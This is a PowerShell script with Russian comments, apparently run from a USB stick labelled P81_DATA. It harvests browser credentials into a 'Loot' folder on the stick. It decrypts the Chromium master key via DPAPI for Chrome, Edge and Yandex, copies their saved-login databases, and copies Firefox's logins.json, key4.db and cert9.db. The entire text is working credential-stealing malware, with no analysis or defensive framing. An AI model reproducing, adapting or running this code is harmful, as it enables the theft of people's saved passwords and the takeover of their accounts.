# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Создание папки с уникальной меткой
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки ключей Chromium
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS_ALL.txt"

# 4. CHROMIUM ПУТИ (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX_USER"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"},
    @{n="YANDEX_SYS_X86"; p="C:\Program Files (x86)\Yandex\YandexBrowser\Application\User Data"},
    @{n="YANDEX_SYS_X64"; p="C:\Program Files\Yandex\YandexBrowser\Application\User Data"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        $ls = Join-Path $b.p "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch {}
        }

        $profiles = Get-ChildItem -Path $b.p -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Default|Profile" }
        foreach ($p in $profiles) {
            $dbPath = Join-Path $p.FullName "Login Data"
            if (Test-Path $dbPath) {
                $cleanName = "$($b.n)_$($p.Name)_DB.db"
                try {
                    $bytes = [System.IO.File]::ReadAllBytes($dbPath)
                    [System.IO.File]::WriteAllBytes("$dest\$cleanName", $bytes)
                } catch {
                    Copy-Item $dbPath -Destination "$dest\$cleanName" -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
}

# 5. FIREFOX (Теперь забирает и cert9.db)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    $ffProfiles = Get-ChildItem $ffDir -Directory
    foreach ($fp in $ffProfiles) {
        $pName = $fp.Name
        # Список целей расширен файлом cert9.db
        $targets = @("logins.json", "key4.db", "cert9.db")
        
        foreach ($t in $targets) {
            $src = Join-Path $fp.FullName $t
            if (Test-Path $src) {
                # Формат: FIREFOX_профиль_имяфайла
                Copy-Item $src -Destination "$dest\FIREFOX_$($pName)_$t" -Force
            }
        }
    }
}

exit
